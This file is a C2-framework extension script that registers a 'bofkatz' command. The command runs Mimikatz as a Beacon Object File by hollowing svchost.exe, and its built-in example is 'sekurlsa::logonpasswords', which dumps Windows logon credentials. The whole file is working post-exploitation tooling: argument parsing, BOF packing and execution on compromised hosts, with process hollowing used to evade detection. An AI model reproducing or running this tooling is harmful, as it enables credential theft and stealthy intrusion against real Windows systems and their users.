var metadata = {
    name: "BOFKatz",
    description: "Mimikatz BOF via PE hollowing into svchost.exe. Requires high integrity / SYSTEM."
};

var cmd_bofkatz = ax.create_command(
    "bofkatz",
    "Execute mimikatz via BOF. Hollows svchost.exe with embedded katz PE. Requires elevated privileges.",
    'bofkatz "privilege::debug" "sekurlsa::logonpasswords"'
);

cmd_bofkatz.addArgBool("--async", "Run BOF asynchronously (recommended for long-running mimikatz commands)");
cmd_bofkatz.addArgString("arguments", false, "Mimikatz arguments (default: coffee exit)");

cmd_bofkatz.setPreHook(function(id, cmdline, parsed_json, ...parsed_lines) {
    var raw = cmdline.trim().replace(/^bofkatz\s*/, "");
    var async = "";
    if (parsed_json["--async"]) {
        async = "-a ";
        raw = raw.replace(/--async\s*/, "");
    }
    raw = raw.trim();

    var commands = [];
    var current = "";
    var inQuote = false;
    for (var i = 0; i < raw.length; i++) {
        if (raw[i] === '"') {
            inQuote = !inQuote;
        } else if (raw[i] === ' ' && !inQuote) {
            if (current) { commands.push(current); current = ""; }
        } else {
            current += raw[i];
        }
    }
    if (current) commands.push(current);

    while (commands.length > 0 && commands[commands.length - 1].toLowerCase() === "exit") {
        commands.pop();
    }
    if (commands.length === 0) commands.push("coffee");

    var mimiArgs = "";
    for (var j = 0; j < commands.length; j++) {
        if (j > 0) mimiArgs += " ";
        if (commands[j].indexOf(' ') !== -1) {
            mimiArgs += '"' + commands[j] + '"';
        } else {
            mimiArgs += commands[j];
        }
    }

    var bof_params = ax.bof_pack("cstr", [mimiArgs]);
    var bof_path = ax.script_dir() + "BOFKatz." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof ${async}"${bof_path}" ${bof_params}`, "BOFKatz: mimikatz via PE hollowing");
});

var group = ax.create_commands_group("BOFKatz", [cmd_bofkatz]);

ax.register_commands_group(group, ["beacon", "gopher", "kharon"], ["windows"], []);
